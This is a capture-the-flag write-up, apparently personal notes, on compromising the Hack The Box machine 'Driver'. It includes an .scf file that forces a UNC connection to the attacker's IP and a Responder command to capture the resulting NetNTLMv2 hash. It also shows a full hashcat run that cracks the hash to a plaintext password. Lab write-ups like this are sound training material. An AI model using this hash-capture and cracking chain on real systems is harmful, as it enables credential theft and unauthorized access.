#  Initial shell as 'tony' user
## From [[Driver/10 - Common Enumeration]] it is discovered that SMB signing is disabled
From [[Driver/10 - Common Enumeration]] it is discovered that SMB signing is disabled.
```bash
Host script results:
|_clock-skew: mean: 6h59m29s, deviation: 3s, median: 6h59m26s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.10:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-10-04T17:41:25
|_  start_date: 2021-10-04T14:45:24

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   213.88 ms 10.10.14.1
2   213.94 ms 10.10.11.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.56 seconds
```
Also from crackmapexec,
![[Pasted image 20211007183540.png]]
## If SMB signing is disabled we can do NTLM relay attack
If SMB signing is disabled we can do NTLM relay attack to get user hash.To perform this attack we will first start `responder` tool in and on http://10.10.11.106/fw_up.php we will upload Shell Command File `.scf` file with following contents 
```bash
[Shell]

Command=2

IconFile=\\10.10.14.98\share\dfsdfsdf.scf # IP address with which responder is started

[Taskbar]

Command=ToggleDesktop
```
Note: SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share as explained in [link](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).
As soon as we upload a `.scf.` with  filename starting from `@` (so that file is placed first in folder and executed as soon as it is uploaded).
## Uploading `.scf` to get NTLM Hash via responder
Uploading `.scf` to get NTLM Hash via responder listening via command ` sudo responder -I tun0 -wrf`.
![[Pasted image 20211007185038.png]]
## Cracking this hash via hashcat
```bash
~/Dropbox/Documents/htb/boxes/driver ❯ hashcat -m 5600  --force hash.hash /home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4460  CPU @ 3.20GHz, 5716/5780 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TONY::DRIVER:c61fbe0c35b5c167:03be8d54cb224656162cfdd067b82a04:010100000000000032b8dcee79bbd7019a63b0aca1ef19a100000000020000000000000000000000:liltony

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TONY::DRIVER:c61fbe0c35b5c167:03be8d54cb224656162cf...000000
Time.Started.....: Thu Oct  7 10:56:54 2021, (1 sec)
Time.Estimated...: Thu Oct  7 10:56:55 2021, (0 secs)
Guess.Base.......: File (/home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   484.2 kH/s (3.49ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 32768/14344385 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 28672/14344385 (0.20%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: softball27 -> eatme1

Started: Thu Oct  7 10:56:32 2021
Stopped: Thu Oct  7 10:56:56 2021
```
cracked hash `TONY::DRIVER:c61fbe0c35b5c167:03be8d54cb224656162cfdd067b82a04:010100000000000032b8dcee79bbd7019a63b0aca1ef19a100000000020000000000000000000000:liltony`
which password `liltony`.
## Getting shell as tony via evil-winrm
![[Pasted image 20211007185353.png]]


